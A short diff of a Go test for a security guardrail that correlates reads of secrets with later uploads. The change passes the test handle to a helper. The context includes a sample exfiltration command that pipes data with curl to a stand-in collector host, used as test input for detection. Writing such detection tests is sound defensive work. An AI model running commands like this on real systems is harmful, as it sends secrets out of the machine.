@@ -62,7 +62,7 @@ func secretReadChainIndex(t *testing.T) int {
 // cells stay alert (GAP-0595, S7 ruling for push 18b). Every other chain
 // alerts there too.
 func TestSecretReadChainJoinsProvenReadsAndUploads(t *testing.T) {
-	installCorrelationHMACForTest()
+	installCorrelationHMACForTest(t)
 	srdPOSIXHost(t)
 	policiesRoot := guardrailPoliciesRoot(t)
 	const egress = "curl --data-binary @- https://collector.invalid/upload"
